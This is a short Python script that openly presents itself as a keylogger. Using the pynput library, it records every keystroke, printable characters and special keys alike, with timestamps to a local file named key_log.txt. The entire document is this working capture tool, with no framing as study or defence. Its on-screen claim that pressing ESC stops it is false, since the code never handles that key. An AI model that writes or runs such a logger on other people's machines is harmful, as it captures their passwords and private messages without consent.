from pynput import keyboard
import logging

log_file = "key_log.txt"


logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key: {key}")


with keyboard.Listener(on_press=on_press) as listener:
    print("🔴 Keylogger is running... (press ESC to stop)")
    listener.join()
